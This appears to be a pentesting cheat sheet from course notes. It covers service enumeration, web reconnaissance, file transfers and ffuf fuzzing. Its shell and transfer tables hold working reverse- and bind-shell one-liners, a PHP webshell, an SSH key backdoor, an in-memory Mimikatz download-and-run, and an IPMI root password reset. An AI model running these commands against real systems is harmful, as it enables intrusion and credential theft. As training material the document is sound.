
## Generic cheat sheet

### Basic Tools

|**Command**|**Description**|
|---|---|
|**General**||
|`sudo openvpn user.ovpn`|Connect to VPN|
|`ifconfig`/`ip a`|Show our IP address|
|`netstat -rn`|Show networks accessible via the VPN|
|`ssh user@10.10.10.10`|SSH to a remote server|
|`ftp 10.129.42.253`|FTP to a remote server|
|**tmux**||
|`tmux`|Start tmux|
|`ctrl+b`|tmux: default prefix|
|`prefix c`|tmux: new window|
|`prefix 1`|tmux: switch to window (`1`)|
|`prefix shift+%`|tmux: split pane vertically|
|`prefix shift+"`|tmux: split pane horizontally|
|`prefix ->`|tmux: switch to the right pane|
|**Vim**||
|`vim file`|vim: open `file` with vim|
|`esc+i`|vim: enter `insert` mode|
|`esc`|vim: back to `normal` mode|
|`x`|vim: Cut character|
|`dw`|vim: Cut word|
|`dd`|vim: Cut full line|
|`yw`|vim: Copy word|
|`yy`|vim: Copy full line|
|`p`|vim: Paste|
|`:1`|vim: Go to line number 1.|
|`:w`|vim: Write the file 'i.e. save'|
|`:q`|vim: Quit|
|`:q!`|vim: Quit without saving|
|`:wq`|vim: Write and quit|

### Pentesting

| **Command**                                                                           | **Description**                                                       |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                       |
| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                   |                                                                       |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                        | List potential directories in `robots.txt`                            |
| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
| **Public Exploits**                                                                   |                                                                       |
| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
| `show options`                                                                        | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                      |                                                                       |
| `nc -lvnp 1234`                                                                       | Start a `nc` listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Upgrade shell TTY (2)                                                 |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                              |                                                                       |
| `./linpeas.sh`                                                                        | Run `linpeas` script to enumerate remote server                       |
| `sudo -l`                                                                             | List available `sudo` privileges                                      |
| `sudo -u user /bin/echo Hello World!`                                                 | Run a command with `sudo`                                             |
| `sudo su -`                                                                           | Switch to root user (if we have access to `sudo su`)                  |
| `sudo su user -`                                                                      | Switch to a user (if we have access to `sudo su`)                     |
| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
| `ssh root@10.10.10.10 -i key`                                                         | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                |                                                                       |
| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0`                                                                   | Convert a file to `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convert a file from `base64` back to its orig                         |
| `md5sum shell`                                                                        | Check the file's `md5sum` to ensure it converted correctly            |


##  Infrastructure-based Enumeration

| **Command**                                                         | **Description**                              |
| ------------------------------------------------------------------- | -------------------------------------------- |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency.                    |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done`           | Scan each IP address in a list using Shodan. |

### Host-based Enumeration

##### FTP

|**Command**|**Description**|
|---|---|
|`ftp <FQDN/IP>`|Interact with the FTP service on the target.|
|`nc -nv <FQDN/IP> 21`|Interact with the FTP service on the target.|
|`telnet <FQDN/IP> 21`|Interact with the FTP service on the target.|
|`openssl s_client -connect <FQDN/IP>:21 -starttls ftp`|Interact with the FTP service on the target using encrypted connection.|
|`wget -m --no-passive ftp://anonymous:anonymous@<target>`|Download all available files on the target FTP server.|

##### SMB

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //<FQDN/IP>`|Null session authentication on SMB.|
|`smbclient //<FQDN/IP>/<share>`|Connect to a specific SMB share.|
|`rpcclient -U "" <FQDN/IP>`|Interaction with the target using RPC.|
|`samrdump.py <FQDN/IP>`|Username enumeration using Impacket scripts.|
|`smbmap -H <FQDN/IP>`|Enumerating SMB shares.|
|`crackmapexec smb <FQDN/IP> --shares -u '' -p ''`|Enumerating SMB shares using null session authentication.|
|`enum4linux-ng.py <FQDN/IP> -A`|SMB enumeration using enum4linux.|

##### NFS

| **Command**                                               | **Description**                                  |
| --------------------------------------------------------- | ------------------------------------------------ |
| `showmount -e <FQDN/IP>`                                  | Show available NFS shares.                       |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS`                                     | Unmount the specific NFS share.                  |

##### DNS

|**Command**|**Description**|
|---|---|
|`dig ns <domain.tld> @<nameserver>`|NS request to the specific nameserver.|
|`dig any <domain.tld> @<nameserver>`|ANY request to the specific nameserver.|
|`dig axfr <domain.tld> @<nameserver>`|AXFR request to the specific nameserver.|
|`dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`|Subdomain brute forcing.|

##### SMTP

| **Command**                                                                    | **Description**        |
| ------------------------------------------------------------------------------ | ---------------------- |
| `telnet <FQDN/IP> 25`                                                          |                        |
| sudo nmap $ip -sC -sV -p25                                                     | Enumerate SMTP service |
| for user in $(cat users.txt); do echo VRFY $user \| nc -nv -w 6 $ip 25  ; done | Enumerate users        |

##### IMAP/POP3

| **Command**                                            | **Description**                         |
| ------------------------------------------------------ | --------------------------------------- |
| `openssl s_client -connect <FQDN/IP>:imaps`            | Connect to the IMAPS service.           |
| `openssl s_client -connect <FQDN/IP>:pop3s`            | Connect to the POP3s service.           |
After connection is established, see the IMAP and POP3 commands:

```
############
IMAP commandCACCs
############
# User's login
a LOGIN username password

# Lists all directories
a LIST "" *

# Creates a mailbox with a specified name
a CREATE "INBOX" 

# Deletes a mailbox
a DELETE "INBOX" 

# Renames a mailbox
a RENAME "ToRead" "Important"

# Returns a subset of names from the set of names that the User has declared as being active or subscribed
a LSUB "" *

# Selects a mailbox so that messages in the mailbox can be accessed
a SELECT INBOX

# Exits the selected mailbox
a UNSELECT INBOX

# Retrieves data (parts of the message) associated with a message in the mailbox
a FETCH <ID> all
# If you want to retrieve the body:
a FETCH <ID> BODY.PEEK[TEXT]

# Removes all messages with the `Deleted` flag set
a CLOSE

# Closes the connection with the IMAP server
a LOGOUT
```


```bash
############
POP3 Commands
############


# Identifies the user
USER username

# Authentication of the user using its password
PASS password

# Requests the number of saved emails from the server
STAT

# Requests from the server the number and size of all emails
LIST 

# Requests the server to deliver the requested email by ID
RETR id

# Requests the server to delete the requested email by ID
DELE id

# Requests the server to display the server capabilities
CAPA

# Requests the server to reset the transmitted information
RSET

# Closes the connection with the POP3 server
QUIT
```

| **Command**                                               | **Description**                                                                                    |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| sudo nmap $ip -sV -p110,143,993,995 -sC`                  | Footprinting the service                                                                           |
| `curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |

After connection is established, see the IMAP and POP3 commands:

##### SNMP

| **Command**                                       | **Description**                                     |
| ------------------------------------------------- | --------------------------------------------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>`   | Querying OIDs using snmpwalk.                       |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*`          | Bruteforcing SNMP service OIDs.                     |



#### SQL

| **Command**                                                 | **Description**                              |
| ----------------------------------------------------------- | -------------------------------------------- |
| <br>sudo nmap $ip -sV -sC -p3306 --script mysql*            | Footprinting the service                     |
| sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip | Run script for checking out empty passwords. |

##### MySQL

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
|                                                      |                                                                                                       |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected database.                                                            |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |
##### MSSQL

| **Command**                                                                                                                                                                                                                                                                                 | **Description**                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip` | Enumerate                                                |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth`                                                                                                                                                                                                                                             | Log in to the MSSQL server using Windows authentication. |

```
# Get Microsoft SQL server version
select @@version;

# Get usernames
select user_name()
go 

# Get databases
SELECT name FROM master.dbo.sysdatabases
go

# Get current database
SELECT DB_NAME()
go

# Get a list of users in the domain
SELECT name FROM master..syslogins
go

# Get a list of users that are sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# And to make sure: 
SELECT is_srvrolemember(‘sysadmin’)
go
# If your user is admin, it will return 1.

# Read Local Files in MSSQL
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```


#### Oracle TNS

| **Command**                                                                                                                  | **Description**                                                                                         |
| ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `python3 ./odat.py all -s <FQDN/IP>`                                                                                         | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                                       | Log in to the Oracle database.                                                                          |
| `python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS.                                                                        |


#### IPMI

| **Command**                                                                                            | **Description**                                                                                                                                         |
| ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nmap -n-sU -p 623 $ip/24                                                                               | Enumerate in a network range                                                                                                                            |
| sudo nmap -sU --script ipmi* -p 623 $ip                                                                | Run all nmap scripts related to ipmi protocol                                                                                                           |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)`                                                            | IPMI version detection.                                                                                                                                 |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`                                                         | Dump IPMI hashes. Similar to the The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack                                                 |
| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H  $ip -U root -P root user list                 | **The IPMI Authentication Bypass via Cipher 0 attack**<br>Install ipmitool and use Cipher 0 to dump a list of users. With -C 0 any password is accepted |
| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 | **The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack** <br>Install ipmitool and change the password of root                         |
|                                                                                                        | **The IPMI Anonymous Authentication attack**                                                                                                            |

### Linux Remote Management

| **Command**                                                 | **Description**                                       |
| ----------------------------------------------------------- | ----------------------------------------------------- |
| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |

### Windows Remote Management

#### [RDP](3389-rdp.md)

| **Command**                                                                                                      | **Description**                                                                                                                                                                                                                                                                  |
| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nmap -Pn -sV -p3389 --script rdp-*  $ip                                                                          | Footprinting RDP                                                                                                                                                                                                                                                                 |
| git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check<br><br>./rdp-sec-check.pl $ip | A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`                                                                | Log in to the RDP server from Linux.                                                                                                                                                                                                                                             |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`                                                    | Execute command using the WMI service.                                                                                                                                                                                                                                           |


#### [WinRM](5985-5986-winrm-windows-remote-management.md)

| **Command**                                        | **Description**             |
| -------------------------------------------------- | --------------------------- |
| nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n | Footprinting WinRM          |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`  | Log in to the WinRM server. |

#### [WMI](135-windows-management-instrumentation-wmi.md)

| **Command**                                                   | **Description**                        |
| ------------------------------------------------------------- | -------------------------------------- |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.            |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |


## Information gathering

Web reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a target before formulating a plan of action. In the digital realm, this translates to accumulating information about a website or web application to identify potential vulnerabilities, security misconfigurations, and valuable assets.

The primary goals of web reconnaissance revolve around gaining a comprehensive understanding of the target's digital footprint. This includes:

- `Identifying Assets`: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.
- `Uncovering Hidden Information`: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.
- `Analyzing the Attack Surface`: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.
- `Gathering Intelligence`: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.

Web reconnaissance can be conducted using either active or passive techniques, each with its own advantages and drawbacks:

|Type|Description|Risk of Detection|Examples|
|---|---|---|---|
|Active Reconnaissance|Involves directly interacting with the target system, such as sending probes or requests.|Higher|Port scanning, vulnerability scanning, network mapping|
|Passive Reconnaissance|Gathers information without directly interacting with the target, relying on publicly available data.|Lower|Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media|

### WHOIS

WHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.

For example, if you wanted to find out who owns the domain `example.com`, you could run the following command in your terminal:

Code: bash

```bash
whois example.com
```

This would return a wealth of information, including the registrar, registration, and expiration dates, nameservers, and contact information for the domain owner.

However, it's important to note that WHOIS data can be inaccurate or intentionally obscured, so it's always wise to verify the information from multiple sources. Privacy services can also mask the true owner of a domain, making it more difficult to obtain accurate information through WHOIS.

### DNS

The Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into the numerical IP addresses computers use to communicate. Like GPS converting a destination's name into coordinates, DNS ensures your browser reaches the correct website by matching its name with its IP address. This eliminates memorizing complex numerical addresses, making web navigation seamless and efficient.

The `dig` command allows you to query DNS servers directly, retrieving specific information about domain names. For instance, if you want to find the IP address associated with `example.com`, you can execute the following command:

Code: bash

```bash
dig example.com A
```

This command instructs `dig` to query the DNS for the `A` record (which maps a hostname to an IPv4 address) of `example.com`. The output will typically include the requested IP address, along with additional details about the query and response. By mastering the `dig` command and understanding the various DNS record types, you gain the ability to extract valuable information about a target's infrastructure and online presence.

DNS servers store various types of records, each serving a specific purpose:

|Record Type|Description|
|---|---|
|A|Maps a hostname to an IPv4 address.|
|AAAA|Maps a hostname to an IPv6 address.|
|CNAME|Creates an alias for a hostname, pointing it to another hostname.|
|MX|Specifies mail servers responsible for handling email for the domain.|
|NS|Delegates a DNS zone to a specific authoritative name server.|
|TXT|Stores arbitrary text information.|
|SOA|Contains administrative information about a DNS zone.|

### Subdomains

Subdomains are essentially extensions of a primary domain name, often used to organize different sections or services within a website. For example, a company might use `mail.example.com` for their email server or `blog.example.com` for their blog.

From a reconnaissance perspective, subdomains are incredibly valuable. They can expose additional attack surfaces, reveal hidden services, and provide clues about the internal structure of a target's network. Subdomains might host development servers, staging environments, or even forgotten applications that haven't been properly secured.

The process of discovering subdomains is known as subdomain enumeration. There are two main approaches to subdomain enumeration:

|Approach|Description|Examples|
|---|---|---|
|`Active Enumeration`|Directly interacts with the target's DNS servers or utilizes tools to probe for subdomains.|Brute-forcing, DNS zone transfers|
|`Passive Enumeration`|Collects information about subdomains without directly interacting with the target, relying on public sources.|Certificate Transparency (CT) logs, search engine queries|

`Active enumeration` can be more thorough but carries a higher risk of detection. Conversely, `passive enumeration` is stealthier but may not uncover all subdomains. Combining both techniques can significantly increase the likelihood of discovering a comprehensive list of subdomains associated with your target, expanding your understanding of their online presence and potential vulnerabilities.

#### Subdomain Brute-Forcing

Subdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.

One of the most versatile tools for subdomain brute-forcing is `dnsenum`. This powerful command-line tool combines various DNS enumeration techniques, including dictionary-based brute-forcing, to uncover subdomains associated with your target.

To use `dnsenum` for subdomain brute-forcing, you'll typically provide it with the target domain and a wordlist containing potential subdomain names. The tool will then systematically query the DNS server for each potential subdomain and report any that exist.

For example, the following command would attempt to brute-force subdomains of `example.com` using a wordlist named `subdomains.txt`:

Code: bash

```bash
dnsenum example.com -f subdomains.txt
```

#### Zone Transfers

DNS zone transfers, also known as AXFR (Asynchronous Full Transfer) requests, offer a potential goldmine of information for web reconnaissance. A zone transfer is a mechanism for replicating DNS data across servers. When a zone transfer is successful, it provides a complete copy of the DNS zone file, which contains a wealth of details about the target domain.

This zone file lists all the domain's subdomains, their associated IP addresses, mail server configurations, and other DNS records. This is akin to obtaining a blueprint of the target's DNS infrastructure for a reconnaissance expert.

To attempt a zone transfer, you can use the `dig` command with the `axfr` (full zone transfer) option. For example, to request a zone transfer from the DNS server `ns1.example.com` for the domain `example.com`, you would execute:

Code: bash

```bash
dig @ns1.example.com example.com axfr
```

However, zone transfers are not always permitted. Many DNS servers are configured to restrict zone transfers to authorized secondary servers only. Misconfigured servers, though, may allow zone transfers from any source, inadvertently exposing sensitive information.

#### Virtual Hosts

Virtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.

Since multiple websites share the same IP address, simply scanning the IP won't reveal all the hosted sites. You need a tool that can test different hostnames against the IP address to see which ones respond.

Gobuster is a versatile tool that can be used for various types of brute-forcing, including virtual host discovery. Its `vhost` mode is designed to enumerate virtual hosts by sending requests to the target IP address with different hostnames. If a virtual host is configured for a specific hostname, Gobuster will receive a response from the web server.

To use Gobuster to brute-force virtual hosts, you'll need a wordlist containing potential hostnames. Here's an example command:

Code: bash

```bash
gobuster vhost -u http://192.0.2.1 -w hostnames.txt
```

In this example, `-u` specifies the target IP address, and `-w` specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.

#### Certificate Transparency (CT) Logs

Certificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.

The `crt.sh` website provides a searchable interface for CT logs. To efficiently extract subdomains using `crt.sh` within your terminal, you can use a command like this:

Code: bash

```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

This command fetches JSON-formatted data from `crt.sh` for `example.com` (the `%` is a wildcard), extracts domain names using `jq`, removes any wildcard prefixes (`*.`) with `sed`, and finally sorts and deduplicates the results.

### Web Crawling

Web crawling is the automated exploration of a website's structure. A web crawler, or spider, systematically navigates through web pages by following links, mimicking a user's browsing behavior. This process maps out the site's architecture and gathers valuable information embedded within the pages.

A crucial file that guides web crawlers is `robots.txt`. This file resides in a website's root directory and dictates which areas are off-limits for crawlers. Analyzing `robots.txt` can reveal hidden directories or sensitive areas that the website owner doesn't want to be indexed by search engines.

`Scrapy` is a powerful and efficient Python framework for large-scale web crawling and scraping projects. It provides a structured approach to defining crawling rules, extracting data, and handling various output formats.

Here's a basic Scrapy spider example to extract links from `example.com`:

Code: python

```python
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)
```

After running the Scrapy spider, you'll have a file containing scraped data (e.g., `example_data.json`). You can analyze these results using standard command-line tools. For instance, to extract all links:

Code: bash

```bash
jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

This command uses `jq` to extract links, `awk` to isolate file extensions, `sort` to order them, and `uniq -c` to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.

### Search Engine Discovery

Leveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.

By employing advanced search operators and specialized queries known as "Google Dorks," you can pinpoint specific information buried within search results. Here's a table of some useful search operators for web reconnaissance:

|Operator|Description|Example|
|---|---|---|
|`site:`|Restricts search results to a specific website.|`site:example.com "password reset"`|
|`inurl:`|Searches for a specific term in the URL of a page.|`inurl:admin login`|
|`filetype:`|Limits results to files of a specific type.|`filetype:pdf "confidential report"`|
|`intitle:`|Searches for a term within the title of a page.|`intitle:"index of" /backup`|
|`cache:`|Shows the cached version of a webpage.|`cache:example.com`|
|`"search term"`|Searches for the exact phrase within quotation marks.|`"internal error" site:example.com`|
|`OR`|Combines multiple search terms.|`inurl:admin OR inurl:login`|
|`-`|Excludes specific terms from search results.|`inurl:admin -intext:wordpress`|

By creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.

### Web Archives

Web archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.

The Wayback Machine, a project by the Internet Archive, has been archiving the web for over two decades, capturing billions of web pages from across the globe. This massive historical data collection can be an invaluable resource for security researchers and investigators.

|Feature|Description|Use Case in Reconnaissance|
|---|---|---|
|`Historical Snapshots`|View past versions of websites, including pages, content, and design changes.|Identify past website content or functionality that is no longer available.|
|`Hidden Directories`|Explore directories and files that may have been removed or hidden from the current version of the website.|Discover sensitive information or backups that were inadvertently left accessible in previous versions.|
|`Content Changes`|Track changes in website content, including text, images, and links.|Identify patterns in content updates and assess the evolution of a website's security posture.|

By leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.

##  File Transferr techniques

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell             |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

## Fuzzing with Ffuf

|**Command**|**Description**|
|---|---|
|`ffuf -h`|ffuf help|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|Directory Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|Extension Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|Page Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|Recursive Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|Sub-domain Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|VHost Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|Parameter Fuzzing - GET|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Parameter Fuzzing - POST|
|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Value Fuzzing|

### Wordlists

|**Command**|**Description**|
|---|---|
|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|Directory/Page Wordlist|
|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|Extensions Wordlist|
|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|Domain Wordlist|
